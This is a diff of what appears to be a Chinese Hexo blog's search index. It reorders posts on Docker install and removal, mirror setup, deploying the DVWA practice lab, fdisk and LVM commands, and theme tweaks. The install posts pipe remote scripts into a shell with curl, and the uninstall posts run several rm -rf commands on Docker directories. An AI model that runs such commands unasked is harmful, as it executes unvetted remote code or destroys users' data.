-<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br><span class="line">rm -rf /etc/systemd/system/docker.service.d</span><br><span class="line">rm -rf /etc/systemd/system/docker.service</span><br><span class="line">rm -rf /var/lib/docker</span><br><span class="line">rm -rf /var/<span class="keyword">run</span><span class="language-bash">/docker</span></span><br><span class="line">rm -rf /usr/local/docker</span><br><span class="line">rm -rf /etc/docker</span><br><span class="line">rm -rf /usr/bin/docker* /usr/bin/containerd* /usr/bin/runc /usr/bin/ctr</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-        <tag>docker命令</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>docker 可用镜像源加速镜像025.2.27</title>
     <url>/2024/10/13/docker-%E5%8F%AF%E7%94%A8%E9%95%9C%E5%83%8F%E6%BA%90%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F/</url>
     <content><![CDATA[<h2 id="2025-2-27测试可用"><a href="#2025-2-27测试可用" class="headerlink" title="2025.2.27测试可用"></a>2025.2.27测试可用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.1ms.run&quot;,</span><br><span class="line">    &quot;https://docker.xuanyuan.me&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CentOS Docker 安装</title>
-    <url>/2024/08/09/docker%E5%AE%89%E8%A3%85/</url>
-    <content><![CDATA[<h2 id="自动安装docker"><a href="#自动安装docker" class="headerlink" title="自动安装docker"></a>自动安装docker</h2><p>使用官方安装脚本自动安装：</p>
-<pre><code>curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun
-</code></pre>
-<p>国内安装命令：</p>
-<pre><code>curl -sSL https://get.daocloud.io/docker | sh
-</code></pre>
-<h2 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h2><h4 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p>
-<pre><code>yum remove docker \
-      docker-client \
-      docker-client-latest \
-      docker-common \
-      docker-latest \
-      docker-latest-logrotate \
-      docker-logrotate \
-      docker-engine
-      
-</code></pre>
-<h2 id="安装-Docker-Engine-Community"><a href="#安装-Docker-Engine-Community" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h2><p>Docker Engine-Community：这是 Docker Engine 的开源社区版本，也是最常用的版本。Docker Engine 是 Docker 的核心组件，负责运行容器。Docker Engine-Community 是由 Docker, Inc. 提供的免费版本，适合个人开发者和小团队使用。</p>
-<h4 id="设置仓库"><a href="#设置仓库" class="headerlink" title="设置仓库"></a>设置仓库</h4><p>yum-utils 提供了 yum-config-manager ，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2。</p>
-<pre><code>yum install -y yum-utils
-</code></pre>
-<p>设置仓库</p>
-<pre><code>官方源地址（比较慢）
-sudo yum-config-manager \
---add-repo \
-https://download.docker.com/linux/centos/docker-ce.repo
-
-阿里云
-sudo yum-config-manager \
---add-repo \
-https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
-</code></pre>
-<h4 id="安装-Docker-Engine-Community-1"><a href="#安装-Docker-Engine-Community-1" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>最新版本安装</p>
-<pre><code>yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin
-</code></pre>
-<p>查看版本</p>
-<pre><code>yum list docker-ce --showduplicates | sort -r
-</code></pre>
-<p>指定版本安装（仅需修改26.1.1）</p>
-<pre><code>yum install docker-ce-26.1.1 docker-ce-cli-26.1.1.1 containerd.io
-</code></pre>
-<h2 id="卸载-docker"><a href="#卸载-docker" class="headerlink" title="卸载 docker"></a>卸载 docker</h2><p>删除安装包：</p>
-<pre><code>yum remove docker-ce
-</code></pre>
-<p>删除镜像、容器、配置文件等内容：</p>
-<pre><code>rm -rf /var/lib/docker
-</code></pre>
-]]></content>
       <categories>
         <category>系统运维</category>
         <category>docker</category>
@@ -856,6 +797,65 @@ docker cp wa_data.dat 容器的id:/home/acunetix/.acunetix/data/license
       </tags>
   </entry>
   <entry>
+    <title>CentOS Docker 安装</title>
+    <url>/2024/08/09/docker%E5%AE%89%E8%A3%85/</url>
+    <content><![CDATA[<h2 id="自动安装docker"><a href="#自动安装docker" class="headerlink" title="自动安装docker"></a>自动安装docker</h2><p>使用官方安装脚本自动安装：</p>
+<pre><code>curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun
+</code></pre>
+<p>国内安装命令：</p>
+<pre><code>curl -sSL https://get.daocloud.io/docker | sh
+</code></pre>
+<h2 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h2><h4 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p>
+<pre><code>yum remove docker \
+      docker-client \
+      docker-client-latest \
+      docker-common \
+      docker-latest \
+      docker-latest-logrotate \
+      docker-logrotate \
+      docker-engine
+      
+</code></pre>
+<h2 id="安装-Docker-Engine-Community"><a href="#安装-Docker-Engine-Community" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h2><p>Docker Engine-Community：这是 Docker Engine 的开源社区版本，也是最常用的版本。Docker Engine 是 Docker 的核心组件，负责运行容器。Docker Engine-Community 是由 Docker, Inc. 提供的免费版本，适合个人开发者和小团队使用。</p>
+<h4 id="设置仓库"><a href="#设置仓库" class="headerlink" title="设置仓库"></a>设置仓库</h4><p>yum-utils 提供了 yum-config-manager ，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2。</p>
+<pre><code>yum install -y yum-utils
+</code></pre>
+<p>设置仓库</p>
+<pre><code>官方源地址（比较慢）
+sudo yum-config-manager \
+--add-repo \
+https://download.docker.com/linux/centos/docker-ce.repo
+
+阿里云
+sudo yum-config-manager \
+--add-repo \
+https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
+</code></pre>
+<h4 id="安装-Docker-Engine-Community-1"><a href="#安装-Docker-Engine-Community-1" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>最新版本安装</p>
+<pre><code>yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin
+</code></pre>
+<p>查看版本</p>
+<pre><code>yum list docker-ce --showduplicates | sort -r
+</code></pre>
+<p>指定版本安装（仅需修改26.1.1）</p>
+<pre><code>yum install docker-ce-26.1.1 docker-ce-cli-26.1.1.1 containerd.io
+</code></pre>
+<h2 id="卸载-docker"><a href="#卸载-docker" class="headerlink" title="卸载 docker"></a>卸载 docker</h2><p>删除安装包：</p>
+<pre><code>yum remove docker-ce
+</code></pre>
+<p>删除镜像、容器、配置文件等内容：</p>
+<pre><code>rm -rf /var/lib/docker
+</code></pre>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>dvwa-命令执行</title>
     <url>/2024/10/14/dvwa-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
     <content><![CDATA[<h2 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h2><p>命令执行漏洞主要是针对有网络测试的页面，如网络设备的web管理页面等等，利用其执行命令的输入窗口执行其他命令。</p>
@@ -875,36 +875,6 @@ docker cp wa_data.dat 容器的id:/home/acunetix/.acunetix/data/license
         <category>dvwa</category>
       </categories>
       <tags>
-        <tag>dvwa</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dvwa-部署（docker）</title>
-    <url>/2024/10/14/dvwa-%E9%83%A8%E7%BD%B2%EF%BC%88docker%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>发现配置了镜像加速也无法通过search查到镜像，但是下载没问题，通过网上查询镜像名称下载即可：</p>
-<pre><code>https://hub.docker.com/
-</code></pre>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull docker pull sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
-
-<h2 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
-
-<p>默认账号密码</p>
-<pre><code>dvwa/dvwa
-admin/password
-</code></pre>
-<h2 id="许可证"><a href="#许可证" class="headerlink" title="许可证"></a>许可证</h2><p>通过网上使用方法使用其他人的密钥发现导入无法使用，可能是方式有问题，我是用的镜像提供的命令导入密钥</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 -e RECAPTCHA_PUBLIC_KEY=YOUR_KEY -e RECAPTCHA_PRIVATE_KEY=YOUR_KEY sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
-
-<p>网上的使用方法<br>在DVWA-master&#x2F;config&#x2F;config.inc.php文件中找到下面代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27; &#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27; &#x27;;</span><br></pre></td></tr></table></figure>
-<p>将其修改为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>dvwa</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
         <tag>dvwa</tag>
       </tags>
   </entry>
@@ -958,43 +928,6 @@ admin/password
       </tags>
   </entry>
   <entry>
-    <title>分区命令</title>
-    <url>/2025/01/15/fdisk/</url>
-    <content><![CDATA[<h2 id="fdisk"><a href="#fdisk" class="headerlink" title="fdisk"></a>fdisk</h2><h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><p>fdisk 路径 参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb</span><br></pre></td></tr></table></figure>
-
-<p>一般配合使用的有<br>df -h<br>lsblk<br>mkfs.ext4<br>…….</p>
-<h3 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分区操作类</span><br><span class="line">a：切换分区的启动标志。当需要设置某个分区为可启动分区时使用，比如在多系统安装时指定引导系统所在的分区。</span><br><span class="line">d：删除一个分区。当分区不再需要或需要重新划分磁盘空间时，可用来删除现有分区，但此操作会丢失该分区上的数据。</span><br><span class="line">n：添加一个新的分区。可用于在磁盘上创建新的存储空间区域，需指定分区类型（主分区、扩展分区或逻辑分区等）、起始扇区和结束扇区等信息。</span><br><span class="line">t：改变分区的系统标识（系统ID）。不同的系统ID代表不同的文件系统类型或分区用途，如 Linux、Windows、交换分区等，通过修改系统ID可让操作系统正确识别分区类型。</span><br><span class="line"></span><br><span class="line">分区表操作类</span><br><span class="line">g：创建一个新的空的 GPT（GUID Partition Table）分区表。GPT 是一种较新的分区表格式，支持大于 2TB 的分区，适用于大容量磁盘。</span><br><span class="line">G：创建一个 IRIX（SGI）分区表。IRIX 是一种 Unix 操作系统，该命令用于创建适用于该系统的特殊分区表。</span><br><span class="line">o：创建一个新的空的 DOS 分区表。DOS 分区表是传统的分区表格式，广泛应用于早期的 Windows 系统等，最多支持 4 个主分区或 3 个主分区加 1 个扩展分区。</span><br><span class="line"></span><br><span class="line">显示与验证类</span><br><span class="line">l：列出已知的分区类型。可帮助用户了解各种系统ID对应的分区类型，以便在修改分区系统ID时进行参考。</span><br><span class="line">p：打印分区表。显示磁盘上当前的分区信息，包括分区编号、起始扇区、结束扇区、分区大小、系统ID等，方便用户查看磁盘分区布局。</span><br><span class="line">v：验证分区表。检查分区表的完整性和正确性，如分区是否有重叠、分区表格式是否正确等，确保磁盘分区结构的稳定性。</span><br><span class="line"></span><br><span class="line">其他操作类</span><br><span class="line">b：编辑 BSD disklabel。BSD 是一种 Unix 类操作系统，该命令用于编辑其特有的磁盘标签，进行更细致的分区管理。</span><br><span class="line">c：切换 DOS 兼容性标志。在某些情况下，可能需要调整分区表的兼容性设置，以确保在不同系统或工具下能正确识别磁盘分区。</span><br><span class="line">q：退出而不保存更改。当用户在操作过程中发现错误或不想修改分区信息时，可选择此命令退出工具，之前所做的更改不会被写入磁盘。</span><br><span class="line">s：创建一个新的空的 Sun disklabel。Sun 是一种 Unix 工作站，该命令用于创建其特有的磁盘标签。</span><br><span class="line">u：改变显示/输入单位。可切换单位如扇区、KB、MB、GB 等，方便用户根据需要更直观地查看和设置分区大小等信息。</span><br><span class="line">w：将分区表写入磁盘并退出。当完成所有分区操作且确认无误后，使用此命令将更改保存到磁盘，使新的分区布局生效。</span><br><span class="line">x：额外功能（仅限专家使用）。包含一些高级的、不常用的分区操作选项，普通用户一般不建议使用，除非对分区操作非常熟悉。</span><br></pre></td></tr></table></figure>
-
-<h2 id="逻辑卷"><a href="#逻辑卷" class="headerlink" title="逻辑卷"></a>逻辑卷</h2><p>创建常用命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb1</span><br><span class="line">pvs</span><br><span class="line"></span><br><span class="line">vgcreate vgtest /dev/sdb1</span><br><span class="line">vgs</span><br><span class="line"></span><br><span class="line">lvcreate -L 4G -n lvtest01 vgtest</span><br><span class="line">lvcreate -l 100%FREE -n lvtest02 vgtest</span><br><span class="line">lvs</span><br></pre></td></tr></table></figure>
-
-
-<p>删除常用命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvremove /dev/vgtest/lvtest01</span><br><span class="line">vgremove  vgtest</span><br><span class="line">pvremove /dev/sdb1</span><br></pre></td></tr></table></figure>
-
-<h2 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h2><h3 id="设备或资源忙"><a href="#设备或资源忙" class="headerlink" title="设备或资源忙"></a>设备或资源忙</h3><p>如果有返回：</p>
-<pre><code>The partition table has been altered!
-
-Calling ioctl() to re-read partition table.
-
-WARNING: Re-reading the partition table failed with error 16: 设备或资源忙.
-The kernel still uses the old table. The new table will be used at
-the next reboot or after you run partprobe(8) or kpartx(8)
-</code></pre>
-<p>重新识别磁盘即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">partprobe /dev/sdb</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>linux</category>
-        <category>命令</category>
-      </categories>
-      <tags>
-        <tag>linux命令</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>github部署hexo</title>
     <url>/2024/08/02/github%E9%83%A8%E7%BD%B2hexo/</url>
     <content><![CDATA[<h2 id="本地ssh连接-GitHub"><a href="#本地ssh连接-GitHub" class="headerlink" title="本地ssh连接 GitHub"></a>本地ssh连接 GitHub</h2><h3 id="创建密钥"><a href="#创建密钥" class="headerlink" title="创建密钥"></a>创建密钥</h3><p>确保下载了git后输入命令</p>
@@ -1036,6 +969,73 @@ the next reboot or after you run partprobe(8) or kpartx(8)
         <tag>博客</tag>
         <tag>github</tag>
         <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dvwa-部署（docker）</title>
+    <url>/2024/10/14/dvwa-%E9%83%A8%E7%BD%B2%EF%BC%88docker%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>发现配置了镜像加速也无法通过search查到镜像，但是下载没问题，通过网上查询镜像名称下载即可：</p>
+<pre><code>https://hub.docker.com/
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull docker pull sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
+
+<h2 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
+
+<p>默认账号密码</p>
+<pre><code>dvwa/dvwa
+admin/password
+</code></pre>
+<h2 id="许可证"><a href="#许可证" class="headerlink" title="许可证"></a>许可证</h2><p>通过网上使用方法使用其他人的密钥发现导入无法使用，可能是方式有问题，我是用的镜像提供的命令导入密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 -e RECAPTCHA_PUBLIC_KEY=YOUR_KEY -e RECAPTCHA_PRIVATE_KEY=YOUR_KEY sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
+
+<p>网上的使用方法<br>在DVWA-master&#x2F;config&#x2F;config.inc.php文件中找到下面代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27; &#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27; &#x27;;</span><br></pre></td></tr></table></figure>
+<p>将其修改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>dvwa</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+        <tag>dvwa</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>分区命令</title>
+    <url>/2025/01/15/fdisk/</url>
+    <content><![CDATA[<h2 id="fdisk"><a href="#fdisk" class="headerlink" title="fdisk"></a>fdisk</h2><h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><p>fdisk 路径 参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb</span><br></pre></td></tr></table></figure>
+
+<p>一般配合使用的有<br>df -h<br>lsblk<br>mkfs.ext4<br>…….</p>
+<h3 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分区操作类</span><br><span class="line">a：切换分区的启动标志。当需要设置某个分区为可启动分区时使用，比如在多系统安装时指定引导系统所在的分区。</span><br><span class="line">d：删除一个分区。当分区不再需要或需要重新划分磁盘空间时，可用来删除现有分区，但此操作会丢失该分区上的数据。</span><br><span class="line">n：添加一个新的分区。可用于在磁盘上创建新的存储空间区域，需指定分区类型（主分区、扩展分区或逻辑分区等）、起始扇区和结束扇区等信息。</span><br><span class="line">t：改变分区的系统标识（系统ID）。不同的系统ID代表不同的文件系统类型或分区用途，如 Linux、Windows、交换分区等，通过修改系统ID可让操作系统正确识别分区类型。</span><br><span class="line"></span><br><span class="line">分区表操作类</span><br><span class="line">g：创建一个新的空的 GPT（GUID Partition Table）分区表。GPT 是一种较新的分区表格式，支持大于 2TB 的分区，适用于大容量磁盘。</span><br><span class="line">G：创建一个 IRIX（SGI）分区表。IRIX 是一种 Unix 操作系统，该命令用于创建适用于该系统的特殊分区表。</span><br><span class="line">o：创建一个新的空的 DOS 分区表。DOS 分区表是传统的分区表格式，广泛应用于早期的 Windows 系统等，最多支持 4 个主分区或 3 个主分区加 1 个扩展分区。</span><br><span class="line"></span><br><span class="line">显示与验证类</span><br><span class="line">l：列出已知的分区类型。可帮助用户了解各种系统ID对应的分区类型，以便在修改分区系统ID时进行参考。</span><br><span class="line">p：打印分区表。显示磁盘上当前的分区信息，包括分区编号、起始扇区、结束扇区、分区大小、系统ID等，方便用户查看磁盘分区布局。</span><br><span class="line">v：验证分区表。检查分区表的完整性和正确性，如分区是否有重叠、分区表格式是否正确等，确保磁盘分区结构的稳定性。</span><br><span class="line"></span><br><span class="line">其他操作类</span><br><span class="line">b：编辑 BSD disklabel。BSD 是一种 Unix 类操作系统，该命令用于编辑其特有的磁盘标签，进行更细致的分区管理。</span><br><span class="line">c：切换 DOS 兼容性标志。在某些情况下，可能需要调整分区表的兼容性设置，以确保在不同系统或工具下能正确识别磁盘分区。</span><br><span class="line">q：退出而不保存更改。当用户在操作过程中发现错误或不想修改分区信息时，可选择此命令退出工具，之前所做的更改不会被写入磁盘。</span><br><span class="line">s：创建一个新的空的 Sun disklabel。Sun 是一种 Unix 工作站，该命令用于创建其特有的磁盘标签。</span><br><span class="line">u：改变显示/输入单位。可切换单位如扇区、KB、MB、GB 等，方便用户根据需要更直观地查看和设置分区大小等信息。</span><br><span class="line">w：将分区表写入磁盘并退出。当完成所有分区操作且确认无误后，使用此命令将更改保存到磁盘，使新的分区布局生效。</span><br><span class="line">x：额外功能（仅限专家使用）。包含一些高级的、不常用的分区操作选项，普通用户一般不建议使用，除非对分区操作非常熟悉。</span><br></pre></td></tr></table></figure>
+
+<h2 id="逻辑卷"><a href="#逻辑卷" class="headerlink" title="逻辑卷"></a>逻辑卷</h2><p>创建常用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb1</span><br><span class="line">pvs</span><br><span class="line"></span><br><span class="line">vgcreate vgtest /dev/sdb1</span><br><span class="line">vgs</span><br><span class="line"></span><br><span class="line">lvcreate -L 4G -n lvtest01 vgtest</span><br><span class="line">lvcreate -l 100%FREE -n lvtest02 vgtest</span><br><span class="line">lvs</span><br></pre></td></tr></table></figure>
+
+
+<p>删除常用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvremove /dev/vgtest/lvtest01</span><br><span class="line">vgremove  vgtest</span><br><span class="line">pvremove /dev/sdb1</span><br></pre></td></tr></table></figure>
+
+<h2 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h2><h3 id="设备或资源忙"><a href="#设备或资源忙" class="headerlink" title="设备或资源忙"></a>设备或资源忙</h3><p>如果有返回：</p>
+<pre><code>The partition table has been altered!
+
+Calling ioctl() to re-read partition table.
+
+WARNING: Re-reading the partition table failed with error 16: 设备或资源忙.
+The kernel still uses the old table. The new table will be used at
+the next reboot or after you run partprobe(8) or kpartx(8)
+</code></pre>
+<p>重新识别磁盘即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">partprobe /dev/sdb</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>linux</category>
+        <category>命令</category>
+      </categories>
+      <tags>
+        <tag>linux命令</tag>
       </tags>
   </entry>
   <entry>
@@ -1105,6 +1105,45 @@ the next reboot or after you run partprobe(8) or kpartx(8)
       </tags>
   </entry>
   <entry>
+    <title>hexo-butterfly美化</title>
+    <url>/2024/08/03/hexo-butterfly%E7%BE%8E%E5%8C%96/</url>
+    <content><![CDATA[<h2 id="hexo博客一图流"><a href="#hexo博客一图流" class="headerlink" title="hexo博客一图流"></a>hexo博客一图流</h2><h3 id="实现效果展示"><a href="#实现效果展示" class="headerlink" title="实现效果展示"></a>实现效果展示</h3><p>头部背景与主体部分背景无缝连接<br><img src="/images/pasted-22.png" alt="upload successful"></p>
+<h3 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h3><p>通过开启butterfly主题留下的inject模块功能</p>
+<h4 id="添加css代码"><a href="#添加css代码" class="headerlink" title="添加css代码"></a>添加css代码</h4><p>先在主题的css文件夹中创建custom.css文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd themes/butterfly/source/css/</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-24.png" alt="upload successful"></p>
+<p>编辑让顶部背景和页脚背景透明的css文件<br>vim custom.css</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#footer &#123;</span><br><span class="line">	background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header &#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#footer::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[data-theme＝&quot;dark&quot;] #footer::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">[data-theme＝&quot;dark&quot;] #page-header::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="config-yml中开启inject部分功能"><a href="#config-yml中开启inject部分功能" class="headerlink" title="_config.yml中开启inject部分功能"></a>_config.yml中开启inject部分功能</h4><p>将head部分注释取消<br><img src="/images/pasted-23.png" alt="upload successful"></p>
+<h4 id="更换背景"><a href="#更换背景" class="headerlink" title="更换背景"></a>更换背景</h4><p>vim搜索背景，更换background</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /hexo/themes/butterfly/_config.yml</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-25.png" alt="upload successful"></p>
+<h3 id="效果实现"><a href="#效果实现" class="headerlink" title="效果实现"></a>效果实现</h3><h4 id="启动hexo查看效果"><a href="#启动hexo查看效果" class="headerlink" title="启动hexo查看效果"></a>启动hexo查看效果</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+<p>刷新页面<br><img src="/images/pasted-22.png" alt="upload successful"></p>
+<h2 id="文章封面"><a href="#文章封面" class="headerlink" title="文章封面"></a>文章封面</h2><h3 id="封面"><a href="#封面" class="headerlink" title="封面"></a>封面</h3><p>修改部分为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim themes/butterfly/_config.yml</span><br><span class="line"></span><br><span class="line">cover:</span><br><span class="line">  #display the cover or not (是否顯示文章封面)</span><br><span class="line">  index_enable: false	#首页</span><br><span class="line">  aside_enable: false	#侧边</span><br><span class="line">  archives_enable: false#归档</span><br><span class="line">  #the position of cover in home page (封面顯示的位置)</span><br><span class="line">  #left/right/both</span><br><span class="line">  position: both</span><br><span class="line">  #When cover is not set, the default cover is displayed (當沒有設置cover時，默認的封面顯示)</span><br><span class="line">  default_cover: </span><br><span class="line">    # - https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg</span><br></pre></td></tr></table></figure>
+
+<h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>分页，也就是文章内中显示的下一页上一页按钮，可通过配置文章封面显示图片，也可以通过设置主题色改变其颜色。</p>
+<h2 id="置顶文章滚动页"><a href="#置顶文章滚动页" class="headerlink" title="置顶文章滚动页"></a>置顶文章滚动页</h2><h3 id="NPM-插件安装"><a href="#NPM-插件安装" class="headerlink" title="NPM 插件安装"></a>NPM 插件安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-swiper-bar --save</span><br></pre></td></tr></table></figure>
+
+<h3 id="新增网站根目录-config-配置项-不是主题的"><a href="#新增网站根目录-config-配置项-不是主题的" class="headerlink" title="新增网站根目录_config 配置项 (不是主题的)"></a>新增网站根目录_config 配置项 (不是主题的)</h3><p>添加以下代码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swiper:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  priority: 2</span><br><span class="line">  enable_page: /</span><br><span class="line">  layout:</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">id</span></span><br><span class="line">    name: recent-posts</span><br><span class="line">    index: 0</span><br><span class="line">  temple_html: <span class="string">&#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;height: auto;width: 100%&quot;&gt;&lt;div class=&quot;blog-slider swiper-container-fade swiper-container-horizontal&quot; id=&quot;swiper_container&quot;&gt;$&#123;temple_html_item&#125;&lt;/div&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">  plus_style: <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
